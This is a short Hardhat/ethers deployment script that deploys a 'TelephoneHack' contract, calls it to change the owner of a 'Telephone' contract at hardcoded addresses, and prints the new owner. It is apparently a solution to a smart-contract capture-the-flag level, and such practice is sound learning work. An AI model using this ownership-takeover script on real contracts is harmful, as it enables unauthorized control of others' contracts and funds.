const main = async () => {
  const [signer] = await ethers.getSigners();
  const contractFactory = await ethers.getContractFactory('TelephoneHack');
  const contract = await contractFactory.deploy();
  await contract.changeTelephoneOwner(
    '0x7a0b7cB9435a54685D748DB12c7650338df3FDa5'
  );
  const telephoneFactory = await ethers.getContractFactory('Telephone');
  const telephone = await telephoneFactory.attach(
    '0xd956969e96304e7b0f98f9fa9bcbf85df52d18d5'
  );
  let owner = await telephone.owner();
  console.log(`Owner of telephone: ${owner}`);
};

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (e) {
    console.log(e);
    process.exit(1);
  }
};
runMain();
